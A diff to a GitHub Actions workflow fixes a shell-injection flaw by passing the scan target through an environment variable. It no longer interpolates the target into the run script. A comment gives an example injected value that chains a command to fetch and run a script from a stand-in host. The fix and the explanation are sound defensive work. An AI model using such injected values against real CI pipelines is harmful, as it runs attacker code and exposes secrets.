@@ -39,8 +39,14 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Assert the headers the CSP claims to set
+        # The target arrives through an ENV VAR, never interpolated into the
+        # script body. `${{ }}` inside a run: block is substituted before bash
+        # sees it, so a target of `x; curl evil.sh | sh` would execute - a real
+        # injection into our own CI, found by our own Semgrep rule
+        # (run-shell-injection) rather than by review.
+        env:
+          TARGET: ${{ github.event.inputs.target || 'https://sandscope.vercel.app' }}
         run: |
-          TARGET="${{ github.event.inputs.target || 'https://sandscope.vercel.app' }}"
           echo "scanning $TARGET"
           HEADERS=$(curl -sS -D - -o /dev/null "$TARGET" || true)
           echo "$HEADERS"
